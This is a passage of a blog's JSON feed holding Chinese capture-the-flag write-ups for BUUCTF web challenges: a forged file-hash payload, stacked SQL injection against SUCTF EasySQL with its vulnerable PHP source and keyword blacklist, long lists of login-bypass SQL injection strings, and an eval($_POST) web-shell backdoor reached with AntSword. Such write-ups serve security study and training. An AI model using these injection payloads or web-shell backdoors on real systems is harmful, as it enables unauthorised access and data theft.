class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token builtin\">hash</span><span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>cookie_secret<span class=\"token operator\">+</span>s1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hash</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n610463dc2fc8906a2682dd82ca291cec<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>最终payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">file<span class=\"token operator\">?</span>filename<span class=\"token operator\">=</span><span class=\"token operator\">/</span>fllllllllllllag<span class=\"token operator\">&amp;</span>filehash<span class=\"token operator\">=</span><span class=\"token number\">610463</span>dc2fc8906a2682dd82ca291cec<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>得到flag</p>\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/01/suctf-2019-easysql/",
            "url": "https://0xdadream.github.io/2021/03/01/suctf-2019-easysql/",
            "title": "SUCTF_2019 EasySQL",
            "date_published": "2021-03-01T00:17:00.000Z",
            "content_html": "<h2 id=\"SUCTF-2019-EasySQL\"><a href=\"#SUCTF-2019-EasySQL\" class=\"headerlink\" title=\"[SUCTF 2019]EasySQL\"></a>[SUCTF 2019]EasySQL</h2><p>打开源码得到</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>query<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>此处post传参，参数名query</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">query<span class=\"token operator\">=</span><span class=\"token number\">11</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span>\n<span class=\"token keyword\">Array</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">11</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">//回显点貌似只有一个</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>这道waf过滤了太多关键词了，又想到堆叠注入</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">query<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>show databases<span class=\"token punctuation\">;</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span>\n<span class=\"token keyword\">Array</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">Array</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=&gt;</span> ctf <span class=\"token punctuation\">)</span> <span class=\"token keyword\">Array</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=&gt;</span> ctftraining <span class=\"token punctuation\">)</span> <span class=\"token keyword\">Array</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=&gt;</span> information_schema <span class=\"token punctuation\">)</span> <span class=\"token keyword\">Array</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=&gt;</span> mysql <span class=\"token punctuation\">)</span> <span class=\"token keyword\">Array</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=&gt;</span> performance_schema <span class=\"token punctuation\">)</span> <span class=\"token keyword\">Array</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=&gt;</span> test <span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">query<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>show tables<span class=\"token punctuation\">;</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span>\n<span class=\"token keyword\">Array</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">Array</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=&gt;</span> Flag <span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>猜测flag在Flag表里</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$post</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'query'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"||flag from Flag\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//不知道哪儿来的源码</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>这里就转为对||的处理</p>\n<p>第一种直接用*查询全部</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">payload\nquery<span class=\"token operator\">=</span><span class=\"token operator\">*</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span>\n<span class=\"token comment\">//select *,1||flag from Flag  等效于select *,1 from Flag</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>第二种 使用<code>set sql_mode=PIPES_AS_CONCAT;</code>将||视为字符串的连接操作符而非或运算符。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">payload\nquery<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>set sql_mode<span class=\"token operator\">=</span>pipes_as_concat<span class=\"token punctuation\">;</span>select <span class=\"token number\">1</span><span class=\"token comment\">// '||' 前面是真就会跳过后面</span>\n<span class=\"token comment\">//select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag</span>\n<span class=\"token comment\">//1||flag合并成一个单位回显</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>题目源码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">include_once</span> <span class=\"token string double-quoted-string\">\"config.php\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$post</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$get</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">global</span> <span class=\"token variable\">$MysqlLink</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">//GetPara();</span>\n    <span class=\"token variable\">$MysqlLink</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"localhost\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$datauser</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$datapass</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$MysqlLink</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Mysql Connect Error!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token variable\">$selectDB</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_select_db</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$MysqlLink</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$dataName</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$selectDB</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Choose Database Error!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$k</span><span class=\"token operator\">=&gt;</span><span class=\"token variable\">$v</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token variable\">$post</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$k</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token function\">addslashes</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$k</span><span class=\"token operator\">=&gt;</span><span class=\"token variable\">$v</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token comment\">//die();</span>\n<span class=\"token delimiter important\">?&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span><span class=\"token punctuation\">&gt;</span></span> Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>query<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">&gt;</span></span>\n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$post</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'query'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$BlackList</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//var_dump(preg_match(\"/{$BlackList}/is\",$post['query']));</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/<span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$BlackList</span><span class=\"token punctuation\">}</span></span>/is\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$post</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'query'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">//echo $post['query'];</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Nonono.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$post</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'query'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Too long.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$post</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'query'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"||flag from Flag\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">mysqli_multi_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$MysqlLink</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">do</span><span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_store_result</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$MysqlLink</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_row</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                    <span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>@<span class=\"token function\">mysqli_next_result</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$MysqlLink</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token delimiter important\">?&gt;</span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/01/ji-ke-da-tiao-zhan-2019-easysql/",
            "url": "https://0xdadream.github.io/2021/03/01/ji-ke-da-tiao-zhan-2019-easysql/",
            "title": "极客大挑战_2019 EasySQL",
            "date_published": "2021-03-01T00:07:00.000Z",
            "content_html": "<h2 id=\"极客大挑战-2019-EasySQL\"><a href=\"#极客大挑战-2019-EasySQL\" class=\"headerlink\" title=\"[极客大挑战 2019]EasySQL\"></a>[极客大挑战 2019]EasySQL</h2><p>这是一道sql注入的题</p>\n<p>进入题目  两个输入框 用户名，密码</p>\n<p>猜测弱密码，admin passwd 不行</p>\n<p>输入’报错  可以注入</p>\n<p>这里可以用万能密码注入</p>\n<p>php</p>\n<pre class=\"line-numbers language-php+HTML\" data-language=\"php+HTML\"><code class=\"language-php+HTML\">'or 1=1/&lt;br/&gt;\"or \"a\"=\"a&lt;br/&gt;\"or 1=1--&lt;br/&gt;\"or\"=\"&lt;br/&gt;\"or\"=\"a'='a&lt;br/&gt;\"or1=1--&lt;br/&gt;\"or=or\"&lt;br/&gt;''or'='or'&lt;br/&gt;') or ('a'='a&lt;br/&gt;'.).or.('.a.'='.a&lt;br/&gt;'or 1=1&lt;br/&gt;'or 1=1--&lt;br/&gt;'or 1=1/&lt;br/&gt;'or\"=\"a'='a&lt;br/&gt;'or' '1'='1'&lt;br/&gt;'or''='&lt;br/&gt;'or''=''or''='&lt;br/&gt;'or'='1'&lt;br/&gt;'or'='or'&lt;br/&gt;'or.'a.'='a&lt;br/&gt;'or1=1--&lt;br/&gt;1'or'1'='1&lt;br/&gt;a'or' 1=1--&lt;br/&gt;a'or'1=1--&lt;br/&gt;or 'a'='a'&lt;br/&gt;or 1=1--&lt;br/&gt;or1=1--<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>asp</p>\n<pre class=\"line-numbers language-asp\" data-language=\"asp\"><code class=\"language-asp\">\"or \"a\"=\"a&lt;br/&gt;'.).or.('.a.'='.a &lt;br/&gt;or 1=1--&lt;br/&gt;'or 1=1--&lt;br/&gt;a'or' 1=1--&lt;br/&gt;\"or 1=1--&lt;br/&gt;'or.'a.'='a&lt;br/&gt;\"or\"=\"a'='a&lt;br/&gt;'or''='&lt;br/&gt;or'='or'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>jsp</p>\n<pre class=\"line-numbers language-jsp\" data-language=\"jsp\"><code class=\"language-jsp\">1'or'1'='1&lt;br/&gt;admin' or 1=1/*<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>猜测sql语句</p>\n<p>username=’uesrname’ and passwd=’password’</p>\n<p>构造payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">username<span class=\"token operator\">=</span>admin<span class=\"token string single-quoted-string\">' or '</span><span class=\"token number\">1</span><span class=\"token string single-quoted-string\">'='</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span>admin<span class=\"token string single-quoted-string\">' or '</span><span class=\"token number\">1</span><span class=\"token string single-quoted-string\">'='</span><span class=\"token number\">1</span>\ncheck<span class=\"token operator\">.</span>php<span class=\"token operator\">?</span>username<span class=\"token operator\">=</span><span class=\"token number\">1</span>' <span class=\"token keyword\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">%</span><span class=\"token number\">23</span><span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>1后面’和前面的闭合</p>\n<p>成功</p>\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        },
        {
            "id": "https://0xdadream.github.io/2021/03/01/ji-ke-da-tiao-zhan-2019-knife/",
            "url": "https://0xdadream.github.io/2021/03/01/ji-ke-da-tiao-zhan-2019-knife/",
            "title": "极客大挑战_2019 Knife",
            "date_published": "2021-02-28T23:57:00.000Z",
            "content_html": "<h2 id=\"极客大挑战-2019-Knife\"><a href=\"#极客大挑战-2019-Knife\" class=\"headerlink\" title=\"[极客大挑战 2019]Knife\"></a>[极客大挑战 2019]Knife</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"Syc\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>找菜刀，再结合这个<code>eval($_POST[\"Syc\"]);</code>后门</p>\n<p>用蚁剑连接，密码Syc</p>\n<p>发现flag</p>\n",
            "tags": [
                "web",
                "wp",
                "BUUCTF"
            ]
        }
    ]
}